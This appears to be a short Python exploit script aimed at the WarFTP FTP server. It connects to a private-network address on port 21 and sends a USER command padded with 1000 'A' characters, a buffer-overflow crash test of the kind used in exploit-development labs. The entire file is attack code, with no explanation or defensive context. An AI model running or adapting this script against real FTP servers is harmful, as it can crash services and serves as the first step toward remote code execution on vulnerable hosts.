#!/usr/bin/python
import socket
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
buffer = "\x41" * 1000
s.connect(('192.168.43.184',21))
data = s.recv(1024)
print ("Sending data to WarFTP...")
s.send('USER '+buffer+'\r\n')
data = s.recv(1024)
s.send(' PASS PASSWORD '+'\r\n')
s.close()
print ("Finish")
